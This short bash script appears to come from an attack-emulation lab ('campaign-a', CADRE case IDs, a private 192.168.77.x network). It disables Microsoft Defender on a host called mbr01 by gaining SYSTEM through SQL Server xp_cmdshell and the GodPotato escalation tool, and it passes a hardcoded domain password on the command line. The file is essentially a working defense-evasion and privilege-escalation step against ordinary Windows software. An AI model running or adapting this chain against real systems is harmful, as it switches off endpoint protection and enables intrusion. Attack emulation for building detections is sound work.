#!/usr/bin/env bash
# Disable Defender on mbr01 as SYSTEM via SQL xp_cmdshell + GodPotato
set -euo pipefail
source "$(dirname "$0")/../lib/campaign-a-common.sh"

CASE_ID="CADRE-DEFENDER-MBR01-${CASE_DATE:-$(date -u +%Y%m%d)}-ws01"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)
echo "=== DEFENDER-DISABLE-MBR01 | ${CASE_ID} | T0=${T0} ==="

campaign_stage_run_ps1 analyst_t1 'T13r_An@lyst!' campaign-a-t043-disable-defender.ps1 child.cadre.local \
  "-Server ${MBR01:-192.168.77.22} -Username analyst_t1 -Password 'T13r_An@lyst!' -GpPath 'C:\\Windows\\Temp\\cadre-tools\\GodPotato.exe'"

cadre_export "${CASE_ID}" DEFENDER-MBR01 "${T0}" 192.168.77.62
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
echo "=== DEFENDER-DISABLE-MBR01 complete ==="
